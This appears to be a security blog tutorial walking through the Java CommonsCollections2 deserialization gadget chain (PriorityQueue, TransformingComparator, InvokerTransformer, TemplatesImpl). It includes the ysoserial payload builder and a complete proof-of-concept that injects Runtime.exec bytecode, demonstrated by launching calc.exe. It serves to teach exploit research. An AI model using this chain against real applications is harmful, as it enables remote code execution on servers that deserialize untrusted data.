<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CommonsCollection2 | zdaylabs</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
      color: #dcdcdc;
      line-height: 1.6;
      padding: 0 2rem;
      min-height: 100vh;
    }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 2rem 0 1rem;
      border-bottom: 1px solid #333;
    }
    
    .logo {
      font-size: 1.5rem;
      font-weight: bold;
      color: #ffffff;
    }
    
    nav a {
      margin: 0 1rem;
      text-decoration: none;
      color: #ccc;
      font-size: 0.95rem;
    }
    
    nav a:hover {
      color: #fef200;
    }
    
    .socials a {
      margin-left: 1rem;
      color: #999;
      font-size: 1.2rem;
      text-decoration: none;
    }
    
    main {
      max-width: 1000px;
      margin: 2rem auto;
      padding: 0 1rem;
    }
    
    h1 {
      font-size: 2.5rem;
      color: #fff;
      margin-bottom: 1rem;
    }
    
    h2 {
      color: #fef200;
      font-size: 1.8rem;
      margin: 2rem 0 1rem;
      border-bottom: 2px solid #333;
      padding-bottom: 0.5rem;
    }
    
    h3 {
      color: #fef200;
      font-size: 1.4rem;
      margin: 1.5rem 0 0.8rem;
    }
    
    h4 {
      color: #fef200;
    }
    
    .highlight {
      color: #fef200;
      font-weight: 600;
    }
    
    .accent {
      color: #36d1dc;
    }
    
    p {
      color: #bbb;
      margin-bottom: 1rem;
    }
    
    pre {
      background-color: #1e2329;
      border: 1px solid #333;
      border-radius: 4px;
      padding: 1rem;
      overflow-x: auto;
      margin: 1rem 0;
    }
    
    code {
      color: #36d1dc;
      font-family: 'Courier New', monospace;
    }
    
    a {
      color: #36d1dc;
      text-decoration: none;
    }
    
    a:hover {
      color: #fef200;
    }
    
    ul, ol {
      color: #bbb;
    }
    
    li {
      margin-bottom: 0.5rem;
    }
    
    img {
      max-width: 100%;
      height: auto;
      border-radius: 4px;
      margin: 1rem 0;
    }
  </style>
</head>
<body>
  <div id="navigation-placeholder"></div>
  <script src="navigation.js"></script>

  <main>
<h1>CommonsCollection2</h1>

<p>CommonsCollection2 uses Slightly different Approach</p>
<p>Although it uses the TemplatesImpl class to execute our controlled ByteCode along with InvokerTransformer but intead of chainedTransFormers it uses PriorityQueue</p>

<p>So lets First Dive in and understand what is PriorityQueue and how does it works.</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
    
    <span style="color: #cf8e6d;">public class</span> SimplePriorityQueueDemo {
        <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
            PriorityQueue&lt;<span style="color: #cf8e6d;">Integer</span>&gt; pq = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;&gt;();
            pq.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">30</span>);
            pq.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">10</span>);
            pq.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">20</span>);
    
            System.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"Elements in priority order:"</span>);
            <span style="color: #cf8e6d;">while</span> (!pq.<span style="color: #56a8f5;">isEmpty</span>()) {
                System.out.<span style="color: #56a8f5;">println</span>(pq.<span style="color: #56a8f5;">poll</span>());
            }
        }
    }
    </pre>
    </div>
    
</p>
<p>
    On the above code You wil see the numbers getting printed one by One.
</p>
<p>Similarly in the priorityQueue Apart blank construcutors there are constructor that takes comparator and compares the numbers that are in the queue</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    AnotherClass ob = <span style="color: #cf8e6d;">new</span> AnotherClass();
    PriorityQueue&lt;<span style="color: #cf8e6d;">String</span>&gt; pq = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;<span style="color: #cf8e6d;">String</span>&gt;(2, ob);
    pq.<span style="color: #56a8f5;">add</span>(<span style="color: #6aab73;">"a"</span>);
    pq.<span style="color: #56a8f5;">add</span>(<span style="color: #6aab73;">"b"</span>);
    </pre>
    </div>
    
</p>
<p>
    The Another class looks like below
</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">import</span> java.io.IOException;
    <span style="color: #cf8e6d;">import</span> java.io.Serializable;
    <span style="color: #cf8e6d;">import</span> java.util.Comparator;
    
    <span style="color: #cf8e6d;">public class</span> AnotherClass <span style="color: #cf8e6d;">implements</span> Comparator&lt;<span style="color: #cf8e6d;">String</span>&gt;, Serializable {
        <span style="color: #cf8e6d;">public int</span> <span style="color: #56a8f5;">compare</span>(<span style="color: #cf8e6d;">String</span> a, <span style="color: #cf8e6d;">String</span> b) {
            <span style="color: #cf8e6d;">if</span> (a.<span style="color: #56a8f5;">equals</span>(b))
                <span style="color: #cf8e6d;">return</span> <span style="color: #b3ae60;">1</span>;
            <span style="color: #cf8e6d;">else</span> {
                <span style="color: #cf8e6d;">return</span> <span style="color: #b3ae60;">-1</span>;
            }
        }
    }
    </pre>
    </div>
    
</p>
<p>So the priorituQueue will execute the Compare Method Writeen on the AnotherClass.java file and will obtain the ouput</p>
<p>So basically the Constructor takes a comparator , executes the compare function present on it and then obtains the Output.</p>

<p>
    Now lets understand little bit more of the priorityQueue on Desr context<br>
    As we know from Vanila Java Desr method the data received By the readObject method gets executed , and lets say the data we sent is of a class which has a readObject then even if there is a class cast execption the readObject code will still get executed.<br>
    Examining the PriorityQueue, it has a readObject block that looks like Below.
</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">private void</span> <span style="color: #56a8f5;">readObject</span>(java.io.ObjectInputStream s)
        <span style="color: #cf8e6d;">throws</span> java.io.IOException, ClassNotFoundException {
        
        <span style="color: #6aab73;">// Read in size, and any hidden stuff</span>
        s.<span style="color: #56a8f5;">defaultReadObject</span>();
    
        <span style="color: #6aab73;">// Read in (and discard) array length</span>
        s.<span style="color: #56a8f5;">readInt</span>();
    
        SharedSecrets.<span style="color: #56a8f5;">getJavaObjectInputStreamAccess</span>()
            .<span style="color: #56a8f5;">checkArray</span>(s, Object[].<span style="color: #cf8e6d;">class</span>, size);
    
        <span style="color: #cf8e6d;">final Object</span>[] es = queue = <span style="color: #cf8e6d;">new Object</span>[Math.<span style="color: #56a8f5;">max</span>(size, <span style="color: #b3ae60;">1</span>)];
    
        <span style="color: #6aab73;">// Read in all elements.</span>
        <span style="color: #cf8e6d;">for</span> (<span style="color: #cf8e6d;">int</span> i = <span style="color: #b3ae60;">0</span>, n = size; i &lt; n; i++)
            es[i] = s.<span style="color: #56a8f5;">readObject</span>();
    
        <span style="color: #6aab73;">// Elements are guaranteed to be in "proper order", but the</span>
        <span style="color: #6aab73;">// spec has never explained what that might be.</span>
        <span style="color: #56a8f5;">heapify</span>();
    }
    </pre>
    </div>
    
</p>
<p>
    The heapify() check if the comparator is null and if its not null it calls the siftDownUsingComparator().<br>
    This function uses the Comparator we provided it during the initilisation and calls the Compare() method.<br>
    So the code Written on the Compare Method Will get Executed.
</p>

<p>Now Lets Jump into the Payload</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    <span style="color: #cf8e6d;">public Queue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt; <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final String</span> command) <span style="color: #cf8e6d;">throws Exception</span> {
        <span style="color: #cf8e6d;">final Object</span> templates = Gadgets.<span style="color: #56a8f5;">createTemplatesImpl</span>(command);
    
        <span style="color: #6aab73;">// mock method name until armed</span>
        <span style="color: #cf8e6d;">final</span> InvokerTransformer transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"toString"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>], <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>]);
    
        <span style="color: #6aab73;">// create queue with numbers and basic comparator</span>
        <span style="color: #cf8e6d;">final</span> PriorityQueue&lt;<span style="color: #cf8e6d;">Object</span>&gt; queue = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;<span style="color: #cf8e6d;">Object</span>&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> TransformingComparator(transformer));
    
        <span style="color: #6aab73;">// stub data for replacement later</span>
        queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
        queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
    
        <span style="color: #6aab73;">// switch method called by comparator</span>
        Reflections.<span style="color: #56a8f5;">setFieldValue</span>(transformer, <span style="color: #6aab73;">"iMethodName"</span>, <span style="color: #6aab73;">"newTransformer"</span>);
    
        <span style="color: #6aab73;">// switch contents of queue</span>
        <span style="color: #cf8e6d;">final Object</span>[] queueArray = (<span style="color: #cf8e6d;">Object</span>[]) Reflections.<span style="color: #56a8f5;">getFieldValue</span>(queue, <span style="color: #6aab73;">"queue"</span>);
        queueArray[<span style="color: #b3ae60;">0</span>] = templates;
        queueArray[<span style="color: #b3ae60;">1</span>] = <span style="color: #b3ae60;">1</span>;
    
        <span style="color: #cf8e6d;">return</span> queue;
    }
    </pre>
    </div>
    
</p>
<p>We are using TransFormingComparator .So the Compare() on TransFormingComparator will get Executed.<p>
    <p>Lets Take a look into how the Compare() Looks like in the TransFormingCompartor.</p>
    <p>
      <div style="background-color: #1e1f22; color: #bcbec4;">
        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
        <span style="color: #cf8e6d;">public int</span> <span style="color: #56a8f5;">compare</span>(<span style="color: #cf8e6d;">final</span> I obj1, <span style="color: #cf8e6d;">final</span> I obj2) {
            <span style="color: #cf8e6d;">final</span> O value1 = transformer.<span style="color: #56a8f5;">apply</span>(obj1);
            <span style="color: #cf8e6d;">final</span> O value2 = transformer.<span style="color: #56a8f5;">apply</span>(obj2);
            <span style="color: #cf8e6d;">return</span> decorated.<span style="color: #56a8f5;">compare</span>(value1, value2);
        }
        </pre>
        </div>
        
    </p>
    <p>It calls the Transformer.apply(), This transformer is the same TransFormer That we have passed</p>
    <p>
      <div style="background-color: #1e1f22; color: #bcbec4;">
        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
        <span style="color: #cf8e6d;">public</span> TransformingComparator(<span style="color: #cf8e6d;">final</span> Transformer&lt;? <span style="color: #cf8e6d;">super</span> I, ? <span style="color: #cf8e6d;">extends</span> O&gt; transformer) {
            <span style="color: #cf8e6d;">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);
        }
        
        /**
         * Constructs an instance with the given Transformer and Comparator.
         *
         * @param transformer  what will transform the arguments to {@code compare}
         * @param decorated    the decorated Comparator
         */
        <span style="color: #cf8e6d;">public</span> TransformingComparator(
            <span style="color: #cf8e6d;">final</span> Transformer&lt;? <span style="color: #cf8e6d;">super</span> I, ? <span style="color: #cf8e6d;">extends</span> O&gt; transformer,
            <span style="color: #cf8e6d;">final</span> Comparator&lt;O&gt; decorated) {
            <span style="color: #cf8e6d;">this</span>.decorated = decorated;
            <span style="color: #cf8e6d;">this</span>.transformer = transformer; 
        }
        </pre>
        </div>
        
    </p>
    <p>And then it assigns it to this.transformer</p>
    <p>So indeed it takes the TransFromer Provided by us and calls the TransForm() Method</p>
    <p>But wait a sec, it calls the apply(), however there is not apply() in invokerTransformer, so there has to be some kind of code for the translation or apply() to transform</p>
    <p>Check the code where the this.transForm is defined</p>
    <p>
      <div style="background-color: #1e1f22; color: #bcbec4;">
        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
        <span style="color: #cf8e6d;">private final</span> Transformer&lt;? <span style="color: #cf8e6d;">super</span> I, ? <span style="color: #cf8e6d;">extends</span> O&gt; transformer;
        </pre>
        </div>
        
    </p>
    <p>One thing to keep in mind is some modern Java frameworks (like Streams and Lambdas) allow functional interfaces (like Transformer) to be treated like Function<I, O>.</p>
    <p>
        So the below code 
        <div style="background-color: #1e1f22; color: #bcbec4;">
          <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
          Transformer&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">Integer</span>&gt; transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer&lt;&gt;(<span style="color: #6aab73;">"length"</span>, <span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">null</span>);
          <span style="color: #cf8e6d;">Integer</span> length = transformer.<span style="color: #56a8f5;">transform</span>(<span style="color: #6aab73;">"Hello"</span>);  <span style="color: #6aab73;">// Calls transform() directly</span>
          </pre>
          </div>
          
        </p>

       <p> can also be written as
        <div style="background-color: #1e1f22; color: #bcbec4;">
          <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
          Function&lt;<span style="color: #cf8e6d;">String</span>, <span style="color: #cf8e6d;">Integer</span>&gt; func = transformer::<span style="color: #56a8f5;">transform</span>;  <span style="color: #6aab73;">// Adapts `Transformer` to `Function`</span>
          <span style="color: #cf8e6d;">Integer</span> length = func.<span style="color: #56a8f5;">apply</span>(<span style="color: #6aab73;">"Hello"</span>);  <span style="color: #6aab73;">// Calls transform() via apply()</span>
          </pre>
          </div>
          
       </p>


    </p>
    <p>If you check the SuperClass i.e TransFormer.java you will see the below code</p>
    <p>
      <div style="background-color: #1e1f22; color: #bcbec4;">
        <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
        <span style="color: #cf8e6d;">public interface</span> Transformer&lt;T, R&gt; <span style="color: #cf8e6d;">extends</span> Function&lt;T, R&gt; {
        
            <span style="color: #cf8e6d;">@Override</span>
            <span style="color: #cf8e6d;">default</span> R <span style="color: #56a8f5;">apply</span>(<span style="color: #cf8e6d;">final</span> T t) {
                <span style="color: #cf8e6d;">return</span> <span style="color: #56a8f5;">transform</span>(t);
            }
        
            /**
             * Transforms the input object into some output object.
             * <p>
             * The input object SHOULD be left unchanged.
             * </p>
             *
             * @param input  the object to be transformed, should be left unchanged
             * @return a transformed object
             * @throws ClassCastException (runtime) if the input is the wrong class
             * @throws IllegalArgumentException (runtime) if the input is invalid
             * @throws FunctorException (runtime) if the transform cannot be completed
             */
            R <span style="color: #56a8f5;">transform</span>(T input);
        
        }
        </pre>
        </div>
        
    </p>
    <p>This is how the apply function gets converted to transform()</p>
<p>So in the entire Payload we are using the templateImpl and using InvokerTransFormer to call "toString" on it for the code Execute</p>
<p>But wait in TemplatesImpl class there is no "toString" method , so how are we achieveing code Execution with it.</p>
<p>In ysoserial payload , in the later line the "toString" method is getting replaced with "newTransformer"</p>
<p>
    <pre>
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
    </pre>
</p>
<p>And then again using Reflection we are chaingin the content of the queue to the templatesImpl code</p>
<p>
    So basically we are using TemplatesIMpl to load our bytecode, to call the newTransformer() on TemplatesImpl we use InvokerTransFormer and to reach till the invokerTransformer we are using<br>
    TransFormingComparator which again we reach via PriorityQueue's Constructor , and this whole thing will be allowed due to the ReadObject() present in the priorityQueue which will<br>
    Call the hepify() which will call the ShiftdownusingCompartor() and thus call the compareMethod .
</p>
<p>
    Quick Question
</p>
<p>Since we use Reflection and change the "toString" to newTransformer() can we use the newTransformer() directly in our local poc code to execute code.</p>
<p>Answer is Yes,</p>
<p>But the code wiil be slightly different.</p>
<p>The last 4 lines of the code will look somethingLike below.</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;">
    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
    InvokerTransformer transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"newTransformer"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>], <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>]);
    PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;TemplatesImpl&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> TransformingComparator(transformer));
    priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
    priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
    </pre>
    </div>
    
</p>
<p>
    The Entire Code along with CreatesImpl for CommonsCollection2 will look like below with the Above Modification.
</p>

<div style="background-color: #1e1f22; color: #bcbec4;">
  <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  <span style="color: #cf8e6d;">import</span> java.lang.reflect.Field;
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
  <span style="color: #cf8e6d;">import</span> javassist.ClassClassPath;
  <span style="color: #cf8e6d;">import</span> javassist.ClassPool;
  <span style="color: #cf8e6d;">import</span> javassist.CtClass;
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  <span style="color: #cf8e6d;">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
  <span style="color: #cf8e6d;">import</span> java.util.PriorityQueue;
  <span style="color: #cf8e6d;">import</span> javax.xml.transform.Templates;
  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.Transformer;
  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.functors.*;
  <span style="color: #cf8e6d;">import</span> org.apache.commons.collections4.comparators.TransformingComparator;
  
  <span style="color: #cf8e6d;">public class</span> cc2 {
      <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) <span style="color: #cf8e6d;">throws Exception</span> {
          <span style="color: #cf8e6d;">String</span> command = <span style="color: #6aab73;">"calc.exe"</span>;
          ClassPool pool = ClassPool.<span style="color: #56a8f5;">getDefault</span>();
  
          <span style="color: #6aab73;">/*
           * Explanation: Creating bytecode that extends AbstractTranslet
           */</span>
          <span style="color: #cf8e6d;">final</span> CtClass clazz = pool.<span style="color: #56a8f5;">get</span>(cc2.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
          <span style="color: #cf8e6d;">String</span> cmd = <span style="color: #6aab73;">"java.lang.Runtime.getRuntime().exec(\""</span> +
              command.<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\\"</span>, <span style="color: #6aab73;">"\\\\"</span>).<span style="color: #56a8f5;">replace</span>(<span style="color: #6aab73;">"\""</span>, <span style="color: #6aab73;">"\\\""</span>) +
              <span style="color: #6aab73;">"\");"</span>;
          clazz.<span style="color: #56a8f5;">makeClassInitializer</span>().<span style="color: #56a8f5;">insertAfter</span>(cmd);
          CtClass superC = pool.<span style="color: #56a8f5;">get</span>(AbstractTranslet.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getName</span>());
          clazz.<span style="color: #56a8f5;">setSuperclass</span>(superC);
          <span style="color: #cf8e6d;">final byte</span>[] classBytes = clazz.<span style="color: #56a8f5;">toBytecode</span>();
          <span style="color: #cf8e6d;">byte</span>[] maliciousBytecode = classBytes;
  
          <span style="color: #cf8e6d;">TemplatesImpl</span> templates = <span style="color: #cf8e6d;">new</span> TemplatesImpl();
  
          Field bytecodesField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_bytecodes"</span>);
          bytecodesField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
          bytecodesField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #cf8e6d;">new byte</span>[][]{ maliciousBytecode });
  
          Field nameField = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_name"</span>);
          nameField.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
          nameField.<span style="color: #56a8f5;">set</span>(templates, <span style="color: #6aab73;">"Exploit"</span>);
  
          Field tfacname = TemplatesImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"_tfactory"</span>);
          tfacname.<span style="color: #56a8f5;">setAccessible</span>(<span style="color: #cf8e6d;">true</span>);
          tfacname.<span style="color: #56a8f5;">set</span>(templates, TransformerFactoryImpl.<span style="color: #cf8e6d;">class</span>.<span style="color: #56a8f5;">newInstance</span>());
  
          <span style="color: #6aab73;">// Use transformer and transforming comparator</span>
          InvokerTransformer transformer = <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"newTransformer"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>], <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>]);
          PriorityQueue&lt;TemplatesImpl&gt; priorityQueue = <span style="color: #cf8e6d;">new</span> PriorityQueue&lt;TemplatesImpl&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> TransformingComparator(transformer));
          priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
          priorityQueue.<span style="color: #56a8f5;">add</span>(templates);
  
          <span style="color: #6aab73;">/*
          Field field = PriorityQueue.class.getDeclaredField("queue");
          field.setAccessible(true);
          final Object[] queueArray = (Object[]) field.get(priorityQueue);
          queueArray[0] = templates;
          queueArray[1] = 1;
          */</span>
      }
  }
  </pre>
  </div>
  


<p>
    <img src="images/cc/cc2popup.PNG">
</p>
<p>This is how the CommonsCollection2 Payload works, staring from the EntryPoint to Code Execution</p>


<h4>Summary:</h4>
<ul>
  <li><code>CommonsCollections2</code> uses a <code>PriorityQueue</code> and <code>TransformingComparator</code> instead of a chain of transformers or <code>LazyMap</code>.</li>
  <li>The exploit chain is triggered during deserialization via <code>PriorityQueue.readObject()</code>, which calls <code>heapify()</code>.</li>
  <li><code>heapify()</code> invokes <code>compare()</code> from the provided <code>Comparator</code>, in this case a <code>TransformingComparator</code>.</li>
  <li><code>TransformingComparator.compare()</code> internally calls <code>transformer.apply()</code>, which maps to <code>transformer.transform()</code> due to interface inheritance.</li>
  <li><code>InvokerTransformer</code> is used to invoke <code>newTransformer()</code> on a malicious <code>TemplatesImpl</code> object, which executes the injected bytecode.</li>
  <li>The queue contents are manipulated using reflection to ensure <code>TemplatesImpl</code> is used during comparison.</li>
  <li>In a simplified local PoC, the method name can be directly set to <code>newTransformer</code> without needing to override it via reflection.</li>
</ul>

<p>Thats it for Today.</p>
<p>Thanks For Reading.</p>
<p>Happy Hacking.</p>
<p>You can connect with me at:</p>
<p><a href="https://www.linkedin.com/in/swagatkumar/">Linkedin</a></p>
<p><a href="https://x.com/webspl01t3r">Twitter</a></p>

  </main>
</body>
</html>
